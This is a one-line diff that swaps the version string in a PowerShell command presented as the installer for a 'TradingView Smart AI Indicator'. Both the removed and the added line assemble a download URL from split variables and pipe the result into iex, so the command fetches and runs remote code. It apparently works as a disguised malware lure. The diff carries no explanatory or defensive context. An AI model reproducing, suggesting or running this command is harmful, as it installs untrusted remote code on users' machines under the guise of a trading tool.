@@ -1,1 +1,1 @@
-powershell -command "$install='TradingView-Smart-AI-Indicator=2.1.7-6b0a541'; $mode='app'; $SmartAI='TradingView'; iwr ($SmartAI+ 'install.' + $mode) | iex"
+powershell -command "$install='TradingView-Smart-AI-Indicator=2.1.9-9b0a541'; $mode='app'; $SmartAI='TradingView'; iwr ($SmartAI+ 'install.' + $mode) | iex"
